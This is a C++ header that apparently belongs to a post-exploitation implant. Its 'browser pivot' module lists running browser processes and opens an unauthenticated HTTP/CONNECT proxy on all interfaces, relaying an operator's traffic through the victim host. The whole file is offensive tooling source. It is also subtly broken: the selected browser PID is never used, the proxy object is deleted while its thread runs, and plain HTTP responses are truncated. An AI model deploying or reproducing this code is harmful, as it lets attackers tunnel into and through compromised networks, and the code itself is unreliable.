#pragma once
#ifdef _WIN32
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#pragma comment(lib, "ws2_32.lib")
#endif
#include <string>
#include <thread>
#include <atomic>
#include <vector>
#include <cstring>

namespace browser_pivot {

inline void pivot_relay(SOCKET a, SOCKET b, std::atomic<bool>& running) {
    char buf[8192];
    while (running) {
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(a, &fds);
        FD_SET(b, &fds);
        timeval tv = {1, 0};
        int maxFd = static_cast<int>((a > b ? a : b) + 1);
        int sel = select(maxFd, &fds, nullptr, nullptr, &tv);
        if (sel <= 0) continue;
        if (FD_ISSET(a, &fds)) {
            int n = recv(a, buf, sizeof(buf), 0);
            if (n <= 0) break;
            send(b, buf, n, 0);
        }
        if (FD_ISSET(b, &fds)) {
            int n = recv(b, buf, sizeof(buf), 0);
            if (n <= 0) break;
            send(a, buf, n, 0);
        }
    }
}

inline DWORD find_browser_pid() {
    const char* targets[] = {"chrome.exe", "msedge.exe", "firefox.exe", "iexplore.exe"};
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    if (!Process32FirstW(snap, &pe)) { CloseHandle(snap); return 0; }
    do {
        char exeName[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, exeName, sizeof(exeName), nullptr, nullptr);
        for (const char* t : targets) {
            if (_stricmp(exeName, t) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return 0;
}

inline std::string list_browsers() {
    std::string result;
    const char* targets[] = {"chrome.exe", "msedge.exe", "firefox.exe", "iexplore.exe"};
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return "No browser processes found.";
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    if (!Process32FirstW(snap, &pe)) { CloseHandle(snap); return "No browser processes found."; }
    do {
        char exeName[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, exeName, sizeof(exeName), nullptr, nullptr);
        for (const char* t : targets) {
            if (_stricmp(exeName, t) == 0) {
                result += std::to_string(pe.th32ProcessID) + " " + exeName + "\n";
                break;
            }
        }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    if (result.empty()) return "No browser processes found.";
    return result;
}

struct BrowserPivotProxy {
    int localPort;
    DWORD targetPid;
    std::atomic<bool> running{false};
    std::thread thread;

    void start(int port, DWORD pid = 0) {
        localPort = port;
        targetPid = (pid != 0) ? pid : find_browser_pid();
        running = true;
        thread = std::thread([this]() { run(); });
        thread.detach();
    }

    void stop() { running = false; }

private:
    void run() {
#ifdef _WIN32
        WSADATA wsa;
        WSAStartup(MAKEWORD(2, 2), &wsa);
#endif
        SOCKET listenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (listenSock == INVALID_SOCKET) return;
        int opt = 1;
        setsockopt(listenSock, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));
        sockaddr_in bindAddr{};
        bindAddr.sin_family = AF_INET;
        bindAddr.sin_addr.s_addr = INADDR_ANY;
        bindAddr.sin_port = htons(static_cast<u_short>(localPort));
        if (bind(listenSock, (sockaddr*)&bindAddr, sizeof(bindAddr)) != 0) {
            closesocket(listenSock); return;
        }
        if (listen(listenSock, SOMAXCONN) != 0) {
            closesocket(listenSock); return;
        }
#ifdef _WIN32
        u_long nonBlocking = 1;
        ioctlsocket(listenSock, FIONBIO, &nonBlocking);
#endif
        while (running) {
            SOCKET clientSock = accept(listenSock, nullptr, nullptr);
            if (clientSock == INVALID_SOCKET) { Sleep(100); continue; }

            std::thread([this, clientSock]() {
                char req[4096];
                int n = recv(clientSock, req, sizeof(req) - 1, 0);
                if (n <= 0) { closesocket(clientSock); return; }
                req[n] = 0;
                std::string request(req);

                std::string host;
                int port = 0;

                if (request.find("CONNECT") == 0) {
                    size_t sp1 = request.find(' ');
                    size_t sp2 = request.find(' ', sp1 + 1);
                    if (sp1 != std::string::npos && sp2 != std::string::npos) {
                        std::string target = request.substr(sp1 + 1, sp2 - sp1 - 1);
                        size_t colon = target.rfind(':');
                        if (colon != std::string::npos) {
                            host = target.substr(0, colon);
                            port = std::stoi(target.substr(colon + 1));
                        }
                    }
                    if (host.empty() || port == 0) {
                        closesocket(clientSock); return;
                    }
                    addrinfo hints{}, *result = nullptr;
                    hints.ai_family = AF_INET;
                    hints.ai_socktype = SOCK_STREAM;
                    hints.ai_protocol = IPPROTO_TCP;
                    std::string portStr = std::to_string(port);
                    if (getaddrinfo(host.c_str(), portStr.c_str(), &hints, &result) != 0) {
                        closesocket(clientSock); return;
                    }
                    SOCKET remoteSock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
                    if (remoteSock == INVALID_SOCKET) {
                        freeaddrinfo(result); closesocket(clientSock); return;
                    }
                    if (connect(remoteSock, result->ai_addr, (int)result->ai_addrlen) != 0) {
                        freeaddrinfo(result); closesocket(remoteSock); closesocket(clientSock); return;
                    }
                    freeaddrinfo(result);
                    const char* ok = "HTTP/1.1 200 Connection Established\r\n\r\n";
                    send(clientSock, ok, (int)strlen(ok), 0);
                    pivot_relay(clientSock, remoteSock, this->running);
                    closesocket(remoteSock);
                } else {
                    // Not CONNECT — forward as-is to target
                    size_t hostBeg = request.find("Host: ");
                    if (hostBeg == std::string::npos) {
                        closesocket(clientSock); return;
                    }
                    hostBeg += 6;
                    size_t hostEnd = request.find("\r\n", hostBeg);
                    std::string hostHeader = request.substr(hostBeg, hostEnd - hostBeg);
                    size_t colon = hostHeader.rfind(':');
                    if (colon != std::string::npos) {
                        host = hostHeader.substr(0, colon);
                        port = std::stoi(hostHeader.substr(colon + 1));
                    } else {
                        host = hostHeader;
                        port = 80;
                    }
                    addrinfo hints{}, *result = nullptr;
                    hints.ai_family = AF_INET;
                    hints.ai_socktype = SOCK_STREAM;
                    hints.ai_protocol = IPPROTO_TCP;
                    std::string portStr = std::to_string(port);
                    if (getaddrinfo(host.c_str(), portStr.c_str(), &hints, &result) != 0) {
                        closesocket(clientSock); return;
                    }
                    SOCKET remoteSock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
                    if (remoteSock == INVALID_SOCKET) {
                        freeaddrinfo(result); closesocket(clientSock); return;
                    }
                    if (connect(remoteSock, result->ai_addr, (int)result->ai_addrlen) != 0) {
                        freeaddrinfo(result); closesocket(remoteSock); closesocket(clientSock); return;
                    }
                    freeaddrinfo(result);
                    send(remoteSock, request.c_str(), (int)request.size(), 0);
                    char resp[8192];
                    int m = recv(remoteSock, resp, sizeof(resp), 0);
                    if (m > 0) send(clientSock, resp, m, 0);
                    closesocket(remoteSock);
                }
                closesocket(clientSock);
            }).detach();
        }
        closesocket(listenSock);
    }
};

inline BrowserPivotProxy* active_pivot = nullptr;

inline std::string start_pivot(int localPort, DWORD pid = 0) {
    if (active_pivot) return "Browser pivot already running on port " + std::to_string(active_pivot->localPort);
    if (pid == 0) {
        pid = find_browser_pid();
        if (pid == 0) return "No browser processes found. Specify PID or start a browser first.";
    }
    auto* bp = new BrowserPivotProxy();
    bp->start(localPort, pid);
    active_pivot = bp;
    return "Browser pivot started on 0.0.0.0:" + std::to_string(localPort)
         + " (pid: " + std::to_string(pid) + ")";
}

inline std::string stop_pivot() {
    if (!active_pivot) return "No active browser pivot.";
    active_pivot->stop();
    delete active_pivot;
    active_pivot = nullptr;
    return "Browser pivot stopped.";
}

}  // namespace browser_pivot
